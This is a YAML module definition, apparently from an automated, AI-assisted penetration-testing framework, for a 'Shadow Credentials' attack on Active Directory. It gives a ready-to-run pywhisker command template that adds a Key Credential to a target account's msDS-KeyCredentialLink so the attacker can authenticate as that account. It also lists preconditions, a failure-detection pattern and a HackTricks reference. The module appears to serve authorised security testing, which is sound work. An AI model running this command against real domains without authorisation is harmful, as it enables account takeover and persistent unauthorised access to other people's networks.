name: shadow_credentials
category: ad
description: Shadow Credentials attack via pywhisker
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: python3 pywhisker.py -d '{domain}' -u '{username}' -p '{password}'
  --target '{target_user}' --action add --dc-ip {target_ip}
parser: null
expected_effects:
- action_completed
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Adds Key Credential to msDS-KeyCredentialLink. Enables PKINIT auth as target.
  Requires GenericWrite on target user/computer.
hacktricks_ref: windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
